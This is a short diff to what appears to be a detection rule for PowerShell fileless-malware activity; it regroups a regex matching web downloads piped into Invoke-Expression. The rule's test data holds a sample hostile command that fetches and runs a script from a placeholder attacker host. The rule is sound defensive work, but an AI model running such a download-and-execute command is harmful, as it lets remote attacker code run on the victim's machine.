@@ -4,7 +4,7 @@ description: >
   Detects PowerShell downloading and executing remote scripts with IEX. Hallmark of fileless malware attacks.
 
 pattern: |
-  (?i)(iwr|invoke-webrequest|wget|curl|webclient.*downloadstring).*https?://.*\|.*(iex|invoke-expression)
+  (?i)((iwr|invoke-webrequest|wget|curl|webclient.*downloadstring).*https?://.*\|.*(iex|invoke-expression))
 
 malicious:
   - "IWR http://evil.com/payload.ps1 | IEX"
